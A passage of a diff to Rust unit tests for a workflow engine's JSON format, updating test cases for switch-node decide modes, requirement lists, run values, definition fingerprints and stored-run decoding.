+        r#"{"from":"route","to":"fetch","loop":{"maxRounds":2,"decide":"ai"}}"#,
     ));
     let mut raw = serde_json::to_value(&w).unwrap();
     raw["edges"].as_array_mut().unwrap().last_mut().unwrap()["handle"] = json!("bug");
@@ -2943,14 +3153,14 @@ fn edge_handle(text: &str) -> Option<Handle> {
 
 #[test]
 fn a_switch_node_reads_and_writes_back_unchanged() {
-    let text = r#"{"id":"route","type":"switch","value":"{{a.kind}}","cases":["x","y"],"decide":"mono","question":"q"}"#;
+    let text = r#"{"id":"route","type":"switch","value":"{{a.kind}}","cases":["x","y"],"decide":"ai","question":"q"}"#;
     let n = node(text);
     assert_eq!(
         n.kind,
         NodeKind::Switch {
             value: Some("{{a.kind}}".into()),
             cases: vec!["x".into(), "y".into()],
-            decide: Some(Decide::Mono),
+            decide: Some(Decide::Ai),
             question: Some("q".into()),
         }
     );
@@ -2985,7 +3195,7 @@ fn with_requires(requires: Vec<Requirement>) -> Workflow {
 
 fn requires_json(entries: &str) -> String {
     format!(
-        r#"{{"id":"wf-1","name":"W","requires":{entries},"nodes":[{{"id":"trigger","type":"manual"}},{{"id":"report","type":"report"}}]}}"#
+        r#"{{"id":"wf-1","name":"W","requires":{entries},"nodes":[{{"id":"start","type":"manual"}}]}}"#
     )
 }
 
@@ -2995,9 +3205,7 @@ fn parse_str(text: &str) -> Option<Workflow> {
 
 #[test]
 fn requires_is_empty_when_absent_and_not_written_back() {
-    let w = workflow_from(
-        r#"{"id":"wf-1","name":"W","nodes":[{"id":"trigger","type":"manual"},{"id":"report","type":"report"}]}"#,
-    );
+    let w = workflow_from(r#"{"id":"wf-1","name":"W","nodes":[{"id":"start","type":"manual"}]}"#);
     assert!(w.requires.is_empty());
     assert!(w.run_values.is_none());
     let written = text(&w);
@@ -3056,7 +3264,7 @@ fn a_bad_requirement_name_is_kept_so_validation_reports_it() {
 #[test]
 fn run_values_are_read_and_kept_apart_from_input_values() {
     let w = parse_str(
-        r#"{"id":"wf-1","name":"W","inputs":{"a":{"type":"string"}},"inputValues":{"a":"x"},"runValues":{"a":"y","n":2},"nodes":[{"id":"trigger","type":"manual"},{"id":"report","type":"report"}]}"#,
+        r#"{"id":"wf-1","name":"W","inputs":{"a":{"type":"string"}},"inputValues":{"a":"x"},"runValues":{"a":"y","n":2},"nodes":[{"id":"start","type":"manual"}]}"#,
     )
     .unwrap();
     let rv = w.run_values.clone().unwrap();
@@ -3200,14 +3408,10 @@ fn requirement_issues_have_no_node_id() {
 #[test]
 fn fingerprint_of_a_workflow_without_requires_is_byte_identical_to_the_old_shape() {
     let mut w = Workflow::new("wf-golden", "Tiny");
-    w.nodes = vec![
-        node(r#"{"id":"trigger","type":"manual"}"#),
-        node(r#"{"id":"report","type":"report"}"#),
-    ];
-    w.edges = vec![edge(r#"{"from":"trigger","to":"report"}"#)];
+    w.nodes = vec![node(r#"{"id":"start","type":"manual"}"#)];
     assert_eq!(
         definition_fingerprint(&w),
-        r#"{"description":"","edges":[{"from":"trigger","to":"report"}],"inputs":{},"name":"Tiny","nodes":[{"id":"trigger","type":"manual"},{"id":"report","type":"report"}]}"#
+        r#"{"description":"","edges":[],"inputs":{},"name":"Tiny","nodes":[{"id":"start","type":"manual"}]}"#
     );
     let mut with_values = w.clone();
     with_values.run_values = Some(OrderedMap::new());
@@ -3242,7 +3446,7 @@ fn fingerprint_changes_when_a_requirement_or_its_hint_is_added_changed_or_remove
 #[test]
 fn a_stored_run_whose_definition_has_no_requires_decodes_with_an_empty_list() {
     let run: WorkflowRun = serde_json::from_str(
-        r#"{"id":"run-1","workflowId":"wf-1","definition":{"id":"wf-1","name":"W","nodes":[{"id":"trigger","type":"manual"},{"id":"report","type":"report"}]},"status":"done","startedAt":1,"trigger":"manual"}"#,
+        r#"{"id":"run-1","workflowId":"wf-1","definition":{"id":"wf-1","name":"W","nodes":[{"id":"start","type":"manual"}]},"status":"done","startedAt":1,"caller":{"kind":"manual","triggerNode":"start"}}"#,
     )
     .unwrap();
     assert!(run.definition.requires.is_empty());
